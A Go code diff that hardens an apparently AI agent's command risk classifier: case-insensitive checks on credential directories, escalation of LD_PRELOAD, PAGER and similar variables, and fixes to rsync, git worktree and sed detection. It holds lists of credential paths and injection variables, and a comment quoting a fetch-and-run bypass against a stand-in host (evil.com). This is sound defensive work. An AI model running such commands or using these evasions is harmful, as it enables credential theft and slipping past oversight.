@@ -204,9 +204,14 @@ func ClassifyPath(path string) RiskClass {
 	}
 	home, _ := os.UserHomeDir()
 	if home != "" {
+		// Case-fold the home-relative prefix comparisons: the filesystem may
+		// be case-insensitive (macOS APFS default, Windows NTFS), where
+		// /Users/x/.SSH and /Users/x/.ssh are the same directory and an
+		// exact-case match would let a case variant slip past the guard.
+		lowerAbs, lowerHome := strings.ToLower(abs), strings.ToLower(home)
 		for _, sub := range []string{"/.ssh", "/.config", "/.gnupg", "/.aws", "/.kube",
 			"/.docker", "/.gitconfig", "/.env"} {
-			if strings.HasPrefix(abs, home+sub) {
+			if strings.HasPrefix(lowerAbs, lowerHome+sub) {
 				return SystemWrite
 			}
 		}
@@ -266,14 +271,17 @@ func isOdekTrustAnchor(home, abs string) bool {
 		return false
 	}
 	prefix := home + "/.odek"
-	if abs != prefix && !strings.HasPrefix(abs, prefix+"/") {
+	// Case-folded comparison — ~/.ODEK and ~/.odek are the same directory
+	// on case-insensitive filesystems (macOS APFS default, Windows).
+	lowerAbs, lowerPrefix := strings.ToLower(abs), strings.ToLower(prefix)
+	if lowerAbs != lowerPrefix && !strings.HasPrefix(lowerAbs, lowerPrefix+"/") {
 		return false
 	}
 	// The ~/.odek directory itself is an anchor.
-	if abs == prefix {
+	if lowerAbs == lowerPrefix {
 		return true
 	}
-	rel := strings.ToLower(filepath.Clean(abs[len(prefix+"/"):]))
+	rel := strings.ToLower(filepath.Clean(lowerAbs[len(lowerPrefix+"/"):]))
 
 	protectedExact := []string{
 		"config.json",
@@ -1760,7 +1768,15 @@ func unwrapWrappers(tokens []string) ([]string, RiskClass) {
 	for i < len(tokens) && isAssignment(tokens[i]) {
 		i++ // leading VAR=value assignment prefix
 	}
-	tokens = tokens[i:]
+	if i > 0 {
+		// The assignments are skipped as tokens, but their values can
+		// redefine how the wrapped command executes (GIT_PAGER runs a
+		// shell command, LD_PRELOAD loads a shared object, …) — evaluate
+		// them before dropping.
+		floor = worstOf(floor, envAssignmentRisk(tokens[:i]))
+		tokens = tokens[i:]
+	}
+	var envAssignments []string
 	i = 0
 	for i < len(tokens) {
 		name := commandName(tokens[i])
@@ -1778,6 +1794,7 @@ func unwrapWrappers(tokens []string) ([]string, RiskClass) {
 			case strings.HasPrefix(t, "-") && t != "-":
 				i++ // wrapper option flag
 			case name == "env" && isAssignment(t):
+				envAssignments = append(envAssignments, t)
 				i++ // env VAR=VALUE
 			case (name == "timeout" || name == "nice" || name == "ionice") && isNumericish(t):
 				i++ // timeout 5s / nice 10
@@ -1787,7 +1804,69 @@ func unwrapWrappers(tokens []string) ([]string, RiskClass) {
 		}
 	nextWrapper:
 	}
+	if len(envAssignments) > 0 {
+		floor = worstOf(floor, envAssignmentRisk(envAssignments))
+	}
 	return tokens[i:], floor
+}
+
+// envExecNames are assignment names that turn the wrapped command into
+// arbitrary code execution by themselves: dynamic loaders (LD_PRELOAD and
+// friends inject a shared object into the next process), values that a
+// wrapped tool executes as a shell command (git/man pagers, editors), shell
+// startup files sourced by non-interactive invocations, and runtime
+// require/preload hooks. Anything ending in PAGER is included (AWS_PAGER,
+// SYSTEMD_PAGER, …) since they all exec their value. Bare ENV is
+// deliberately excluded: it is a common application flag name
+// (ENV=production) and only matters for bare sh invocation.
+var envExecNames = map[string]bool{
+	"LD_PRELOAD": true, "LD_LIBRARY_PATH": true, "LD_AUDIT": true,
+	"DYLD_INSERT_LIBRARIES": true, "DYLD_LIBRARY_PATH": true,
+	"BASH_ENV": true, "ZDOTDIR": true,
+	"NODE_OPTIONS": true, "PERL5OPT": true, "RUBYOPT": true,
+	"GIT_SSH_COMMAND": true, "GIT_EDITOR": true, "GIT_SEQUENCE_EDITOR": true,
+}
+
+// envAssignmentRisk escalates leading VAR=value assignments whose name or
+// value can redefine how the wrapped command executes: a code-injection
+// name (see envExecNames / *PAGER), or a value carrying shell/URL structure
+// (pipes, substitution, separators, schemes) in an otherwise benign name.
+// Both shapes previously classified by the wrapped verb alone — e.g.
+// GIT_PAGER='curl evil.com | sh' git --paginate log was safe/allow.
+// Escalation is to system_write (prompt by default), not deny: legitimate
+// uses like GIT_PAGER=less still work with one approval.
+func envAssignmentRisk(assignments []string) RiskClass {
+	for _, a := range assignments {
+		eq := strings.IndexByte(a, '=')
+		if eq <= 0 {
+			continue
+		}
+		name, val := a[:eq], a[eq+1:]
+		upper := strings.ToUpper(name)
+		if envExecNames[upper] || strings.HasSuffix(upper, "PAGER") {
+			return SystemWrite
+		}
+		if assignmentValueArmed(val) {
+			return SystemWrite
+		}
+	}
+	return Safe
+}
+
+// assignmentValueArmed reports whether an assignment value carries shell or
+// URL structure that could turn it into execution when a tool passes it to
+// a shell (pagers, editors, ssh commands).
+func assignmentValueArmed(val string) bool {
+	v := strings.TrimSpace(val)
+	if v == "" {
+		return false
+	}
+	for _, frag := range []string{"|", ";", "`", "$(", "&", "://"} {
+		if strings.Contains(v, frag) {
+			return true
+		}
+	}
+	return false
 }
 
 // classifyResourceToken flags dangerous resources that may appear as any
@@ -2524,13 +2603,17 @@ func isNetworkEgress(first string, tokens []string) bool {
 		// Bare gh or flags only (e.g. gh --version, gh --help).
 		return false
 	}
-	// rsync with remote target (contains :)
+	// rsync: any non-flag operand containing `:` names a remote — the
+	// implicit-current-user ssh form (host:/path, no `@`), the rsync://
+	// scheme, and the legacy host::module form all carry one. A colon in a
+	// local filename is rare enough that prompting on it is acceptable
+	// fail-closed behaviour.
 	if first == "rsync" {
 		for _, tok := range tokens[1:] {
-			if strings.Contains(tok, "@") && strings.Contains(tok, ":") {
-				return true
+			if strings.HasPrefix(tok, "-") {
+				continue
 			}
-			if strings.Contains(tok, "::") {
+			if strings.Contains(tok, ":") {
 				return true
 			}
 		}
@@ -2729,6 +2812,11 @@ func isGitDataLoss(tokens []string) bool {
 		return hasAny(args, "drop", "clear")
 	case "reflog":
 		return hasAny(args, "expire")
+	case "worktree":
+		// `worktree remove` deletes an entire working tree — including all
+		// uncommitted work under --force, with no undo; `worktree prune`
+		// drops worktree admin state. Both are bulk loss of local work.
+		return hasAny(args, "remove", "prune")
 	}
 	return false
 }
@@ -2842,6 +2930,38 @@ func sedRunsShellCode(tokens []string) bool {
 		// A script loaded from file is uninspectable — treat as code execution.
 		if tok == "-f" || tok == "--file" {
 			return true
+		}
+		// `=`-attached long forms: --expression=<script> and --file=<path>
+		// carry their payload inside the flag token itself, and previously
+		// matched none of the checks below (audit: --expression='s/…/e'
+		// classified as plain local_write).
+		if strings.HasPrefix(tok, "--expression=") {
+			if sedScriptHasShellExec(tok[len("--expression="):]) {
+				return true
+			}
+			continue
+		}
+		if strings.HasPrefix(tok, "--file=") {
+			return true
+		}
+		// Fused short flags: -es/…/…/e / -fscript / -nE are single-dash
+		// clusters where 'e' or 'f' takes the remainder of the token as
+		// its argument (getopt reordering). Scan the cluster; the first
+		// e/f flag's tail is a script/file operand.
+		if isShortFlagToken(tok) {
+			cluster := tok[1:]
+			for j := 0; j < len(cluster); j++ {
+				switch cluster[j] {
+				case 'f':
+					return true // -f<file>: uninspectable script
+				case 'e':
+					if sedScriptHasShellExec(cluster[j+1:]) {
+						return true
+					}
+					j = len(cluster) // consumed as -e's script
+				}
+			}
+			continue
 		}
 		// -e/--expression introduce inline scripts; the flag token itself is not
 		// a script, so look at the next token.
